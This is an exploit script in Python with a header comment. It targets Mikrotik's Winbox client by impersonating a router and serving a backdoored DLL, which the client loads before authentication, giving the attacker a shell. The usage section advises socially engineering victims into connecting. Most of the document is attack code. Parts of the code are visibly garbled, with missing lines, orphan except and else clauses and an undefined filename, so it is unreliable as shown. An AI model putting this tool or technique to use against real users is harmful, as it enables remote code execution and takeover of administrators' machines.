# Exploit Title: 	Mikrotik&#039;s Winbox Remote Code Execution
# Author: 			PoURaN
# Software Link: 	http://www.mikrotik.com/download.html
# Version: 			probably all winbox versions. Tried 2.2.7 - 2.2.18
# Tested on: 		Windows XP SP2, SP3, Windows 7 SP1, Win2k8, Win2k3, Wine
# <> Other files needed by this exploit can be downloaded from http://www.133tsec.com/wp-content/uploads/2012/04/mtikInject.zip <>
#
#  Vulnerability Description 
# ===========================
# When you connect to mikrotik router using winbox, it is asking for an index
# with plugins (DLLs) their size, version and CRCs.
# If something new is found, or if that client haven&#039;t connected to that mikrotik version yet,
# winbox requests the new plugin(s) (.dll file(s)) from mikrotik router.
# When winbox downloads all the DLLs required in order to load the controlling interface of the
# mikrotik router, loads the DLLs and then tries to make an authentication
# to the remote mikrotik router. The vulnerability exploits that winbox
# is loading the remote dlls before authentication and without any further
# confirmation of plugins originality.
#
#  The exploit
# =============
# This is a winbox vulnerability which exploits the way that winbox is working.
# That is the reason why it&#039;s working on all winbox versions (even on today&#039;s version)
# This exploit is based in leading (socialy) the victim to connect to this malicious
# winbox listener, using his/her winbox client.
# More details in www.133tsec.com
# 
#  Usage
# =======
# details in www.133tsec.com
# Download all files that exploit needs from http://www.133tsec.com/wp-content/uploads/2012/04/mtikInject.zip
# In order to use this exploit successfully you have to :
#
# 1. Have index.bin in the folder where .py script is running
# 2. Have all original DLLs of the spoofed index in the folder where .py script is running
#    enter it&#039;s filename when script will ask for it.
#	  *** Your DLL&#039;s filename must have 7 chars length (ex. ppp.dll) ***
#	  *** The gziped version of the dll, must be between 10k-99k (must have 5 digits of size) ***
#	  The above 2 restrictions caused to the fact that i don&#039;t create the index dynamically from the script..
# 4. Social your victim to connect to the machine running the script, and gain the shell u r expecting
#
# <> Greetz flies to mbarb, dennis, andreas, AWMN and all friends and researchers out there <>
# 
import socket,sys,os,struct,random

global fPointer

def SendFile(conn, filename):
	f = open(filename, &#039;rb&#039;)
	global fPointer
	f.seek(fPointer)
	fData = f.read(66049)
	fPointer += 66049
	f.close()
	data = conn.send(fData)


random.seed()
print "\n+-----------------------------------+"
print "|                                   |\\"
print "| Winbox remote client DLL injector | |"
print "|        = coded by PoURaN =        | |"
print "+___________________________________+ |"
print " \___________________________________\|"

randByte = str(random.randint(100,999))		# i need 3 random digits for a random crc
fileRequest = &#039;ppp.dll&#039;		# this will be the file in the index, that the client will request
							# and we&#039;ll send the backdoored dll instead of the original one.

	f = open(filename, &#039;rb&#039;)
	buff = f.read()
	f.close()
except:
	print "[-] Error opening file"
	sys.exit(0)

# This number is very critical for the other structures
	sys.exit(0)

# Make the index include the size of the custom dll file... overwrite the ppp.dll size
# ( That&#039;s why we need 7 chars filelength and 5 chars filesize.. got it? :D ok am a bit lazy... ;p )
f = open(&#039;index514.dat&#039;, &#039;rb&#039;)
myIndex = f.read()
f.close()
myIndex = myIndex[0:0x9B] + randByte+" " + myIndex[0x9F:]		# changing crc to a random one so am sure every time client is downloading my backdoor again.

WinboxHeader = 	("\xFF\x02" +							# WORD: hardcoded
				#"\x70\x70\x70\x2E\x64\x6C\x6C" +		# VARIABLE-SIZED: filename (printable chars) MAX:11 chars
				fileRequest +			# **** THIS IS WRONG IF THE FILENAME LENGTH IS NOT 7 CHARS! *****
				"\x00\x00\x00\x00" +					# VAR-SIZED: zero bytes till strlen(filename) + \x00*X = 11 bytes. These zeroes may not exist if strlen(filename) = 11
				"\x01" +								# BYTE: hardcoded. signals the end of zeros and beginning of the length
				"\x00\x00\x00\x00")						# DWORD: hardcoded zeros before the gzip magic bytes.

print "[+] Waiting connection on port 8291.."
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind((&#039;&#039;, 8291))
s.listen(1)
conn, addr = s.accept()
print &#039;[+] Connection received by&#039;, addr
print "[+] Waiting for index."
data = conn.recv(1024)
if data.find("\x12\x02"+"index"+"\x00") > -1:
	print "[+] Index received!"
else:
	print "[+] Wrong index.. Exiting.."
	sys.exit(0)
print "[+] Sending DLL Index (Step 1)"

# Step 1 : Sending the dll index list...
data = conn.send(myIndex)
data = conn.recv(1024)

global fPointer
fPointer=0

# checking if client requests the .dll we sent.. this depends to the CRC sent in Step 1
while data.find("\x12\x02") > -1:		# If a file is requested.....
		print "[+] Client just requested " + fileRequest
		#########################################################################################
		# Step 2 : Sending the gzip file raw data with the custom header						#
		#########################################################################################
		#########################################################################################
		#	1. The header of the gzip file must be in format: WinboxHeader						#
		#	2. The gzip contents must contain the word 0xFF 0xFF in every 257 bytes (0x101)		#
		#	3. The gzip last 0x101-chunk must contain the word 0x(size till end of file) 0xFF	#
		#########################################################################################
		# Give the spark
		customGzip = WinboxHeader
		customGzip += buff[0:0xED]
		customGzip += &#039;\xFF\xFF&#039;
		#Loop the most data
		for i in range(0x1EC, len(buff), 0xFF):
			customGzip += buff[i-0xFF:i]
			if 	0x101 > (len(buff)-i):		# if it&#039;s the last FF FF appended, then do it \x[(bytesToEOF)byte]\xFF
				customGzip += struct.pack(&#039;=b&#039;, len(buff)-i) + &#039;\xFF&#039;
			else:
				customGzip += &#039;\xFF\xFF&#039;
		#..and finish it
		customGzip += buff[i:len(buff)]
		data = conn.send(customGzip)
		data = conn.recv(1024)
	else:			# else it&#039;s requesting another file from index..
		while (data[2:].split("\x00")[0]!=fileRequest) and data[0:2]=="\x12\x02":		# send other index&#039;s dll except the backdoored...
			fPointer=0
			print "[x] Client is requesting "+data[2:].split("\x00")[0]+" file.."
			CurrentRequest=data[2:].split("\x00")[0]
			while data[2:].split("\x00")[0]==CurrentRequest:
				SendFile(conn, CurrentRequest)
				data = conn.recv(1024)
				print hex(struct.unpack(&#039;=B&#039;, data[18:19])[0]), hex(struct.unpack(&#039;=B&#039;, data[19:20])[0])
print "Succeeded.. Enjoy!"
conn.close()



